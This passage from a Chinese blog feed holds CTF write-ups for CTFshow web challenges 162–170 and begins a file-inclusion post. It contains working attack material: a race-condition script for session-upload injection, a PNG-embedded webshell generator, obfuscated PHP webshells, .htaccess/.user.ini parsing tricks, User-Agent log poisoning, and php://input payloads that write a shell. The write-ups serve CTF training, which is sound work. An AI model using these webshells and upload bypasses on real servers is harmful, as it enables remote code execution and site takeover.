class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">import threading</span><br><span class=\"line\"></span><br><span class=\"line\">session = requests.session()</span><br><span class=\"line\">sess = &#x27;nnnpc&#x27;</span><br><span class=\"line\">url1 = &quot;http://ce89fbe1-10ca-4a2d-808d-95e5976b5bfd.challenge.ctf.show/&quot;</span><br><span class=\"line\">url2 = &quot;http://ce89fbe1-10ca-4a2d-808d-95e5976b5bfd.challenge.ctf.show/upload&quot;</span><br><span class=\"line\">data1 = &#123;</span><br><span class=\"line\">    &#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">file = &#123;</span><br><span class=\"line\">    &#x27;file&#x27;: &#x27;nnnpc&#x27;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">cookies = &#123;</span><br><span class=\"line\">    &#x27;PHPSESSID&#x27;: sess</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def write():</span><br><span class=\"line\">    while True:</span><br><span class=\"line\">        r = session.post(url1, data=data1, files=file, cookies=cookies)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def read():</span><br><span class=\"line\">    while True:</span><br><span class=\"line\">        r = session.get(url2)</span><br><span class=\"line\">        if &#x27;flag&#x27; in r.text:</span><br><span class=\"line\">            print(r.text)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">threads = [threading.Thread(target=write),</span><br><span class=\"line\">           threading.Thread(target=read)]</span><br><span class=\"line\">for t in threads:</span><br><span class=\"line\">    t.start()</span><br></pre></td></tr></table></figure>\n<p>开始做题，看看 web162</p>\n<p>首先上传.user.ini</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/MLqYREfWtza240p6.png!thumbnail\" alt=\"\"></p>\n<p>这里不能指定特定的 1.png 之类的文件，因为对文件内容进行了过滤，把 &quot;.&quot; 过滤了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/8rHmpMrjeF6OVkOy.png!thumbnail\" alt=\"\"></p>\n<p>成功上传，接着上传 png 文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/tzsIqV31EnDv9nDt.png!thumbnail\" alt=\"\"></p>\n<p>成功上传</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/j4kukrf8jvEZr82Q.png!thumbnail\" alt=\"\"></p>\n<p>使用条件竞争脚本 cat flag（我这里使用命令行终端执行）</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/25H76LFtZ8oiMD4o.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>ctfshow{ceb7fdf2-9db7-42e3-a3ea-4763c6b635f4}</strong></p>\n<hr>\n<h1 id=\"web163\"><a class=\"markdownIt-Anchor\" href=\"#web163\">#</a> WEB163</h1>\n<p>本题还是一个 session 的文件包含，但是发现根据 web162 的方法打不通了，于是寻找原因</p>\n<p>我们直接试试.user.ini 包含构造的 session 路径</p>\n<p><strong>语句：</strong></p>\n<p><strong>GIF89A</strong></p>\n<p><strong>auto_append_file=/tmp/sess_nnnpc</strong></p>\n<p>直接上传</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/xe962NsGYqh9jyta.png!thumbnail\" alt=\"\"></p>\n<p>上传成功</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/WjsKSfWp0XkGmXfJ.png!thumbnail\" alt=\"\"></p>\n<p>用条件竞争脚本上传命令并访问</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6X64V8wjXShNwhkH.png!thumbnail\" alt=\"\"></p>\n<p>成功获得 flag</p>\n<p><strong>ctfshow{c636315f-3e55-46c0-9024-00b7c4aabd37}</strong></p>\n<hr>\n<h1 id=\"web164\"><a class=\"markdownIt-Anchor\" href=\"#web164\">#</a> <strong>WEB164</strong></h1>\n<p>本题考察的知识点是 png 格式图片的二次渲染</p>\n<p><strong>知识点：<br>\n在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片并放到网站对应的标签进行显示。</strong></p>\n<p>二次渲染本身就可以理解为为了安全性，对图片进行了一个很好的过滤，便是对图片的一些东西进行了适当的修改，不影响图片的原本模样，降低了风险性。而此类题目的做法便是通过脚本生成一张经过二次渲染之后依然可以有带马的一张图片，从而达到获取信息的目的</p>\n<p>脚本：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,</span><br><span class=\"line\">           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,</span><br><span class=\"line\">           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,</span><br><span class=\"line\">           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,</span><br><span class=\"line\">           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,</span><br><span class=\"line\">           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,</span><br><span class=\"line\">           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,</span><br><span class=\"line\">           0x66, 0x44, 0x50, 0x33);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$img = imagecreatetruecolor(32, 32);</span><br><span class=\"line\"></span><br><span class=\"line\">for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;</span><br><span class=\"line\">   $r = $p[$y];</span><br><span class=\"line\">   $g = $p[$y+1];</span><br><span class=\"line\">   $b = $p[$y+2];</span><br><span class=\"line\">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class=\"line\">   imagesetpixel($img, round($y / 3), 0, $color);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">imagepng($img,&#x27;2.png&#x27;);  //要修改的图片的路径</span><br><span class=\"line\">/* 木马内容</span><br><span class=\"line\">&lt;?$_GET[0]($_POST[1]);?&gt;</span><br><span class=\"line\"> */</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>来看看本题，先使用脚本跑一跑<br>\n方法一：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/wSB2Gq9xvjoiKlSW.png!thumbnail\" alt=\"\"></p>\n<p>打开小皮点击启动</p>\n<p>网站 -&gt;localhost-&gt; 管理 -&gt; 打开根目录</p>\n<p>把脚本存放在根目录下，浏览器访问 127.0.0.1 / 脚本名称，发现能生成 2.png 就成功了</p>\n<p>方法二：</p>\n<p>部署 php 环境，我这里是在 vscode 中部署运行的，如果在 vscode 中运行，就不需要开启小皮和将脚本放入根目录了，在自己定义的目录中即可</p>\n<p>部署环境可以参考这篇博客：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0ODAzMzM1L2FydGljbGUvZGV0YWlscy8xMDg4MDY4NTE=\">https://blog.csdn.net/qq_44803335/article/details/108806851</span></p>\n<p>png 准备好之后就可以上传了，直接上传</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/SGvIOqzNLOcmJACS.png!thumbnail\" alt=\"\"></p>\n<p>发现上传成功，点击查看图片</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1XZK1AEEIFCoNT3T.png!thumbnail\" alt=\"\"></p>\n<p>再用记事本打开 2.png 查看下</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/rZKxODLM1kosoKAd.png!thumbnail\" alt=\"\"></p>\n<p>接下来就是构造命令拿 flag 了，在 url 后面跟上 &amp; 0=system</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2ViOWRiY2M0LTFjNjAtNDNiYy04Nzc1LWUyY2UwM2ExODMwYy5jaGFsbGVuZ2UuY3RmLnNob3cvZG93bmxvYWQucGhwP2ltYWdlPWZiNWM4MWVkM2EyMjAwMDRiNzEwNjk2NDVmMTEyODY3LnBuZyZhbXA7MD1zeXN0ZW0=\">http://eb9dbcc4-1c60-43bc-8775-e2ce03a1830c.challenge.ctf.show/download.php?image=fb5c81ed3a220004b71069645f112867.png&amp;0=system</span></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/7GjeGSPHN9WkwEXO.png!thumbnail\" alt=\"\"></p>\n<p>post data 传 1=tac f*</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/PTqEdUiMwu5GVDgR.png!thumbnail\" alt=\"\"></p>\n<p>execute 之后 ctrl+s 下载保存图片</p>\n<p>用记事本打开图片得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/bA5wIo05zv8A0hyQ.png!thumbnail\" alt=\"\"></p>\n<p><strong>ctfshow{fbaff217-7284-4f2c-87ce-a3f4bd2a9d15}</strong></p>\n<hr>\n<h1 id=\"web165\"><a class=\"markdownIt-Anchor\" href=\"#web165\">#</a> <strong>WEB165</strong></h1>\n<h1 id=\"web166\"><a class=\"markdownIt-Anchor\" href=\"#web166\">#</a> <strong>WEB166</strong></h1>\n<p>本题考查的知识点是只能上传后缀为 zip 的文件，构造一句话 zip 上传</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/lUlgbs6804NHeGaD.png!thumbnail\" alt=\"\"></p>\n<p><strong>语句： <code>&lt;?php @eval($_POST['flag']);?&gt;</code> </strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/klYV8I00yoBbMfhF.png!thumbnail\" alt=\"\"></p>\n<p>上传成功，点击下载文件 bp 抓包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/TB7LHy1bJmXNDJEt.png!thumbnail\" alt=\"\"></p>\n<p>显示了上传路径，这里有两种获取 flag 的方式</p>\n<p>方法一：直接蚁剑 getshell</p>\n<p><strong>路径：</strong><span class=\"exturl\" data-url=\"aHR0cDovLzU5NzJjNTJjLTI1NGMtNGQ3ZS04MzM4LWU3N2E1NjgyMzkwMS5jaGFsbGVuZ2UuY3RmLnNob3cvdXBsb2FkL2Rvd25sb2FkLnBocD9maWxlPWY5MzIyZDJjYmYxYjU5NWVkYTc4ZDQwZWI0Y2MyNjY1LnppcA==\">http://5972c52c-254c-4d7e-8338-e77a56823901.challenge.ctf.show/upload/download.php?file=f9322d2cbf1b595eda78d40eb4cc2665.zip</span></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/DC31b871dxaj8ylv.png!thumbnail\" alt=\"\"></p>\n<p>在 /var/www/html/flag.php 下找到 flag</p>\n<p><strong>ctfshow{2aa24662-a040-4c85-8eba-7ca444b59198}</strong></p>\n<hr>\n<p>方法二：文件包含命令 cat flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/emkjdso9cd6eolFw.png!thumbnail\" alt=\"\"></p>\n<p><strong>路径：</strong><span class=\"exturl\" data-url=\"aHR0cDovLzU5NzJjNTJjLTI1NGMtNGQ3ZS04MzM4LWU3N2E1NjgyMzkwMS5jaGFsbGVuZ2UuY3RmLnNob3cvdXBsb2FkL2Rvd25sb2FkLnBocD9maWxlPWY5MzIyZDJjYmYxYjU5NWVkYTc4ZDQwZWI0Y2MyNjY1LnppcA==\">http://5972c52c-254c-4d7e-8338-e77a56823901.challenge.ctf.show/upload/download.php?file=f9322d2cbf1b595eda78d40eb4cc2665.zip</span></p>\n<p><strong>包含语句：flag=system (“tac …/f*”);phpinfo ();</strong></p>\n<p>bp 抓包发包获得 flag（比较稳）</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/BZsXtNoF6f9ZkqeZ.png!thumbnail\" alt=\"\"></p>\n<p>也可以 hackbar 直接传</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/49WQ3XVuJWGxQeCC.png!thumbnail\" alt=\"\"></p>\n<p>获得 flag</p>\n<p><strong>ctfshow{2aa24662-a040-4c85-8eba-7ca444b59198}</strong></p>\n<hr>\n<h1 id=\"web167\"><a class=\"markdownIt-Anchor\" href=\"#web167\">#</a> <strong>WEB167</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/rHxSUvhtSg2hC97a.png!thumbnail\" alt=\"\"></p>\n<p>看提示应该是和 apache 有关，而本题考察的知识点也就是上传.htaccess 绕过</p>\n<p>.htaccess 和.user.ini 的作用差不多，只不过.htaccess 使用范围仅限在 apache，两者起的都是解析作用</p>\n<p><strong>.htaccess：</strong></p>\n<p><strong>方式一：</strong></p>\n<p><strong>AddType application/x-httpd-php .png</strong></p>\n<p><strong>方式二：</strong></p>\n<p><strong>&lt;FilesMatch “png”&gt;</strong></p>\n<p><strong>SetHandler application/x-httpd-php</strong></p>\n<p><strong> <code>&lt;/FilesMatch&gt;</code> </strong></p>\n<p>开启环境，上传</p>\n<p>本题尝试了一下发现只能上传 jpg 格式的文件，不过不要紧，bp 抓包绕过</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Mpy3HBBFg6ISJZ20.png!thumbnail\" alt=\"\"></p>\n<p>接下来直接上传一句话木马</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ZvqSscM2igX4YgZj.png!thumbnail\" alt=\"\"></p>\n<p>还是有两种方法，用 hackbar cat flag 和蚁剑 getshell</p>\n<p>方法一：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mSRzW5vuX3OIZ966.png!thumbnail\" alt=\"\"></p>\n<p><strong>URL:</strong></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzM0NmU2ZGU5LTc5ZGQtNDY1OC1iN2JiLTFkNGRkMTQxOTY2ZS5jaGFsbGVuZ2UuY3RmLnNob3cvdXBsb2FkL2ZsYWcucG5n\">http://346e6de9-79dd-4658-b7bb-1d4dd141966e.challenge.ctf.show/upload/flag.png</span></p>\n<p><strong>POST data：</strong></p>\n<p><strong>flag=system(“tac …/f*”);phpinfo();</strong></p>\n<p>方法二：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/rplcd6HkrgXHSNNn.png!thumbnail\" alt=\"\"></p>\n<p>/var/www/html/flag.php 找到 flag</p>\n<p><strong>ctfshow{29c520eb-4ced-4f41-94e5-83e115a8ee3d}</strong></p>\n<hr>\n<h1 id=\"web168\"><a class=\"markdownIt-Anchor\" href=\"#web168\">#</a> <strong>WEB168</strong></h1>\n<p>接下来所考察的都是免杀</p>\n<p><strong>一：</strong></p>\n<p><strong>&lt;?php</strong></p>\n<p><strong>$a = “s#y#s#t#e#m”;</strong></p>\n<p><strong>$b = explode(&quot;#&quot;,$a);</strong></p>\n<p><strong>$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];</strong></p>\n<p><strong>$c($_REQUEST[1]);</strong></p>\n<p><strong>?&gt;</strong></p>\n<p><strong>二：</strong></p>\n<p><strong>&lt;?php</strong></p>\n<p><strong>$a=substr(‘1s’,1).‘ystem’;</strong></p>\n<p><strong>$a($_REQUEST[1]);</strong></p>\n<p><strong>?&gt;</strong></p>\n<p><strong>三：</strong></p>\n<p><strong>&lt;?php</strong></p>\n<p><strong>$a=strrev(‘metsys’);</strong></p>\n<p><strong>$a($_REQUEST[1]);</strong></p>\n<p><strong>?&gt;</strong></p>\n<p><strong>四：</strong></p>\n<p><strong>&lt;?php</strong></p>\n<p><strong>$a=$_REQUEST[‘a’];</strong></p>\n<p><strong>$b=$_REQUEST[‘b’];</strong></p>\n<p><strong>$a($b);</strong></p>\n<p><strong>?&gt;</strong></p>\n<p>打开环境，用 bp 抓包修改后缀为 php 上传免杀马</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/0QPu1qzXQ0wbTKkz.png!thumbnail\" alt=\"\"></p>\n<p>成功</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/0SS7ElSfZfvgSzVT.png!thumbnail\" alt=\"\"></p>\n<p>点击下载文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mD8MjBUKIp7BFUg2.png!thumbnail\" alt=\"\"></p>\n<p>看到了路径，但是这个路径并不对，真正的路径是 /upload/1.php</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/cKu7FjNU07Egmpc6.png!thumbnail\" alt=\"\"></p>\n<p>直接 hackbar 进行命令执行</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/VQZcSGJdSlBH95UV.png!thumbnail\" alt=\"\"></p>\n<p><strong>语句：</strong></p>\n<p><strong>1=tac …/f*</strong></p>\n<p>由于页面无法被渲染，所以真正的 flag 就会在页面的注释中体现，切换到查看器查看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/tlcSa7ZeddgcHk6J.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>ctfshow{cd195f91-8967-4b33-bde6-e09622bd78df}</strong></p>\n<hr>\n<h1 id=\"web169\"><a class=\"markdownIt-Anchor\" href=\"#web169\">#</a> <strong>WEB169</strong></h1>\n<p>本题看了一些师傅的博客说是高级免杀，但是我没有成功</p>\n<p>这题可以用日志文件包含来做</p>\n<p>首先，要先来梳理一下题目上传的一些条件，经过尝试之后发现该题条件有：</p>\n<ol>\n<li>\n<p>只允许上传 zip 后缀的文件（因此要上传 zip 后抓包修改）</p>\n</li>\n<li>\n<p>类型只允许是 image/png（千万别忘记修改）<br>\n<strong>语句：</strong></p>\n</li>\n</ol>\n<p><strong>.user.ini：</strong></p>\n<p><strong>auto_append_file=/var/log/nginx/access.log</strong></p>\n<p><strong>（这里的路径可以加 &quot;&quot; 也可不加，一个不行时可以尝试另一个）</strong></p>\n<p><strong>UA 头：</strong></p>\n<p><strong> <code>&lt;?php @eval($_POST['flag']);?&gt;</code> </strong></p>\n<p>接下来就可以开始做题了</p>\n<p>这里我们先上传 user.ini，bp 抓包该类型和名称上传</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/idmBax9cF76xmTXO.png!thumbnail\" alt=\"\"></p>\n<p>这里使用了.user.ini 直接包含日志文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/MnM5seJiDGA6KnPl.png!thumbnail\" alt=\"\"></p>\n<p>成功，接着刷新页面 bp 抓包修改 UA 头</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6MZEYkgulB6ZQICG.png!thumbnail\" alt=\"\"></p>\n<p>修改为一句话，Forward</p>\n<p>接着随便上传一个 php 文件，待会直接用这个 php 进行 getshell</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Sz68V0st7uf1WKSG.png!thumbnail\" alt=\"\"></p>\n<p>这里不需要木马文件，而且木马很容易被过滤，这里询问了下 web 师傅，做出的解释是.user.ini 要解析文件，上传目录下必须要有一个 php 文件，它才能发挥它的作用，因此我们随便传一个不带马的 php 上去即可</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/gijuRAoPN7jTVCdN.png!thumbnail\" alt=\"\"></p>\n<p>成功，点击下载文件的路径并不是我们想要的路径，真正的路径是 /upload/1.php（我这里传上去的 php 名称是 1.php）</p>\n<p>方法一：蚁剑连接</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/awUff2w3rlM664FF.png!thumbnail\" alt=\"\"></p>\n<p>在 /var/www/html/flagaa.php 这个目录下找到 flag</p>\n<p>方法二：</p>\n<p>使用 hackbar 获取 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ThMgExEFtygB6Lms.png!thumbnail\" alt=\"\"></p>\n<p>语句：flag=system (“tac …/f*”);phpinfo ();</p>\n<p>看到页面上的 flag_here 知道了又是无法被渲染，因此去查看器注释中寻找 flag</p>\n<p><strong>ctfshow{c486095a-95b3-4ae6-9763-dfb6da2cdc2a}</strong></p>\n<hr>\n<h1 id=\"web170\"><a class=\"markdownIt-Anchor\" href=\"#web170\">#</a> <strong>WEB170</strong></h1>\n<p>本题方法如上 web169，同样的方法再试一遍即可依然是日志文件包含，这里就不过多记录了</p>\n<hr>\n<p>这里再记录下一种看到的骚姿势，这种姿势是关于上传.htaccess 进行解析的：</p>\n<p>引用其他师傅在 wp 中所做的解释：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如果要上传 .htaccess 文件但有getimagesize、exif_imagetype函数的检查，可以用`#define width 1`和`#define height 1`定义：这样.htaccess文件既不会受到影响而失效，又能绕过检测</span><br><span class=\"line\">.htaccess：</span><br><span class=\"line\">#define width 1</span><br><span class=\"line\">#define height 1</span><br><span class=\"line\">AddType applocation/x-httpd-php .jpg</span><br><span class=\"line\">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.ppp&quot;</span><br></pre></td></tr></table></figure>\n<p>.htaccess 还能配合伪协议的适用，解析已经上传的内容，那么上传的内容可以是 base64 编码后的，从而绕过敏感字符检查</p>\n<p><strong>语句：</strong></p>\n<p><strong>php_value auto_append_file<br>\n&quot;php://filter/convert.base64-decode/resource=./shell.ppp&quot;</strong></p>\n",
            "tags": [
                "WEB"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/CTFshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/",
            "url": "https://nnnpc.github.io/2024/04/16/CTFshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/",
            "title": "CTFshow文件包含",
            "date_published": "2024-04-16T05:58:18.976Z",
            "content_html": "<h1 id=\"初学文件包含\"><a class=\"markdownIt-Anchor\" href=\"#初学文件包含\">#</a> 初学文件包含</h1>\n<p>刚开始只懂一些伪协议什么的，对于一个具体的文件包含并不是很了解，先简单记录下原理</p>\n<p>文件包含漏洞：通过 PHP 函数引入文件时，传入的文件名没有经过合理的验证，从而操作了预想之外的文件，就可能导致意外的文件泄漏甚至恶意代码注入。</p>\n<p>我的理解就是：由于对包含点没有进行一个很好的过滤，导致能够在包含点做出一些预想之外的操作，从而造成一些危害</p>\n<p>这里引用一下别的师傅对 php://filter 的解析：</p>\n<p><strong>php://filter 可以获取指定文件源码。当它与包含函数结合时，php://filter 流会被当作 php 文件执行。所以我们一般对其进行编码，让其不执行。从而导致<br>\n任意文件读取。</strong></p>\n<p>简单来说就是 php://filter 与包含函数结合时。该流就会被当作文件执行，而我们对其进行编码之后，它不会执行，导致了任意文件的读取</p>\n<p>记录一下别的师傅博客写的基础姿势：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php://input可以访问请求的原始数据的只读流。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post设置成文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。遇到file_get_contents()要想到用php://input绕过</span><br><span class=\"line\"></span><br><span class=\"line\">poc1:</span><br><span class=\"line\"></span><br><span class=\"line\">?file=php://input</span><br><span class=\"line\"></span><br><span class=\"line\">[POST DATA] &lt;?php phpinfo();?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">还可以上传一句话木马 poc2</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;);?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">php://filter可以获取指定文件源码。php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。</span><br><span class=\"line\"></span><br><span class=\"line\">poc1:</span><br><span class=\"line\"></span><br><span class=\"line\">?file=php://filter/resource=xxx.php</span><br><span class=\"line\"></span><br><span class=\"line\">poc2:</span><br><span class=\"line\"></span><br><span class=\"line\">?file=php://filter/read=convert.base64-encode/resource=xxx.php</span><br><span class=\"line\"></span><br><span class=\"line\">POC1直接读取xxx.php文件，但大多数时候很多信息无法直接显示在浏览器页面上，所以需要采取POC2中方法将文件内容进行base64编码后显示在浏览器上，再自行解码。</span><br><span class=\"line\"></span><br><span class=\"line\">zip://可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</span><br><span class=\"line\"></span><br><span class=\"line\">zip://中只能传入绝对路径。</span><br><span class=\"line\"></span><br><span class=\"line\">要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）</span><br><span class=\"line\"></span><br><span class=\"line\">只需要是zip的压缩包即可，后缀名可以任意更改。</span><br><span class=\"line\"></span><br><span class=\"line\">相同的类型的还有zlib://和bzip2://</span><br><span class=\"line\"></span><br><span class=\"line\">poc:</span><br><span class=\"line\"></span><br><span class=\"line\">zip://[压缩包绝对路径]#[压缩包内文件]</span><br><span class=\"line\"></span><br><span class=\"line\">?file=zip://D:\\zip.jpg%23phpinfo.txt</span><br><span class=\"line\"></span><br><span class=\"line\">data:// 同样类似与php://input，</span><br><span class=\"line\"></span><br><span class=\"line\">phar:// 有点类似zip://</span><br><span class=\"line\"></span><br><span class=\"line\">phar://中相对路径和绝对路径都可以使用</span><br></pre></td></tr></table></figure>\n<hr>\n<h1 id=\"web78\"><a class=\"markdownIt-Anchor\" href=\"#web78\">#</a> WEB78</h1>\n<p><img 